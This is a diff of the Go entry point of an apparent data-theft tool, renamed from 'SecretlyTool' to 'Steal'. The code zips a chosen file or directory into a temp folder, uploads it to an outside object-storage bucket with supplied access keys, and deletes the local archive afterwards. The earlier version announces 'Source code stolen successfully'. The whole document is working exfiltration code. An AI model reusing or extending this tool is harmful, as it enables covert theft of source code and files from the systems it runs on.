@@ -1,12 +1,12 @@
 package main
 
 import (
-	"SecretlyTool/pakg/pack"
-	"SecretlyTool/pakg/upload"
+	"Steal/pakg/pack"
+	"Steal/pakg/upload"
 	"flag"
 	"fmt"
-	"log"
 	"os"
+	"path/filepath"
 	"runtime"
 	"strconv"
 	"time"
@@ -22,43 +22,61 @@ var (
 )
 
 func main() {
-	sysType := runtime.GOOS
-	var dst string
-	path := strconv.FormatInt(time.Now().Unix(), 10)
-	if sysType == "linux" {
-		dst = "/tmp/" + path + ".tar.gz"
-	}
-	if sysType == "windows" {
-		dst = os.Getenv("temp") + "\\" + path + ".tar.gz"
-	}
-
-	if pack.Pack(*file, dst) != nil {
-		log.Printf("文件 %s 打包错误", *file)
+	src := *file
+	if ok, _ := PathExists(src); !ok {
+		fmt.Println("[-] The specified file does not exist")
 		os.Exit(-1)
 	}
+	sysType := runtime.GOOS
+	var dst string
+	fileName := filepath.Base(src)
+	nowTime := strconv.FormatInt(time.Now().Unix(), 10)
+	if sysType == "linux" {
+		dst = "/tmp/" + fileName + "_" + nowTime + ".zip"
+	}
+	if sysType == "windows" {
+		dst = os.Getenv("temp") + "\\" + fileName + "_" + nowTime + ".zip"
+	}
+	fmt.Println("[+] In the compression")
+	if pack.Zip(src, dst) != nil {
+		fmt.Println("[-] File packing error")
+		os.Exit(-1)
+	}
+	fmt.Println("[+] Packaging complete")
 	if upload.Upload(dst, *AccessKeyId, *AccessKeySecret, *Endpoint, *Bucket) != nil {
-		log.Printf("文件上传出错，请检查参数是否正确", *file)
+		fmt.Println("[-] File upload error, please check the input parameter value")
 		os.Exit(-1)
 	}
 	if os.Remove(dst) != nil {
-		log.Fatalf("删除备份文件 %s 出错，请到 tmp 目录下手动删除", dst)
+		fmt.Println("[-] Failed to delete the package file. Manually delete the package file")
 	}
-	log.Println("OK, Source code stolen successfully !!!")
+	fmt.Println("[+] The file was uploaded successfully")
 
 }
 
 func init() {
-	Banner := " ____                              __    ___               ______              ___      \n/\\  _`\\                           /\\ \\__/\\_ \\             /\\__  _\\            /\\_ \\     \n\\ \\,\\L\\_\\     __    ___  _ __   __\\ \\ ,_\\//\\ \\   __  __   \\/_/\\ \\/   ___    __\\//\\ \\    \n \\/_\\__ \\   /'__`\\ /'___/\\`'__/'__`\\ \\ \\/ \\ \\ \\ /\\ \\/\\ \\     \\ \\ \\  / __`\\ / __`\\ \\ \\   \n   /\\ \\L\\ \\/\\  __//\\ \\__\\ \\ \\/\\  __/\\ \\ \\_ \\_\\ \\\\ \\ \\_\\ \\     \\ \\ \\/\\ \\L\\ /\\ \\L\\ \\_\\ \\_ \n   \\ `\\____\\ \\____\\ \\____\\ \\_\\ \\____\\\\ \\__\\/\\____\\/`____ \\     \\ \\_\\ \\____\\ \\____/\\____\\\n    \\/_____/\\/____/\\/____/\\/_/\\/____/ \\/__/\\/____/`/___/> \\     \\/_/\\/___/ \\/___/\\/____/\n                                                     /\\___/                             \n                                                     \\/__/      By @ 7TEN7               "
+	Banner := "   _____  __                __\n  / ___/ / /_ ___   ____ _ / /\n  \\__ \\ / __// _ \\ / __ `// / \n ___/ // /_ /  __// /_/ // /  \n/____/ \\__/ \\___/ \\__,_//_/   \n                                    By @ 7TEN7               "
 	flag.Parse()
 	fmt.Println(Banner)
 	if len(os.Args) <= 4 {
-		fmt.Println("SecretlyTool version: SecretlyTool/0.0.1\nUsage: SecretlyTool [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
+		fmt.Println("Steal version: SecretlyTool/0.0.2\nUsage: SecretlyTool [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
 		flag.PrintDefaults()
 		os.Exit(0)
 	}
 	if *h == true {
-		fmt.Println("SecretlyTool version: SecretlyTool/0.0.1\nUsage: SecretlyTool [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
+		fmt.Println("Steal version: SecretlyTool/0.0.2\nUsage: SecretlyTool [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
 		flag.PrintDefaults()
 		os.Exit(0)
 	}
+}
+
+func PathExists(path string) (bool, error) {
+	_, err := os.Stat(path)
+	if err == nil {
+		return true, nil
+	}
+	if os.IsNotExist(err) {
+		return false, nil
+	}
+	return false, err
 }
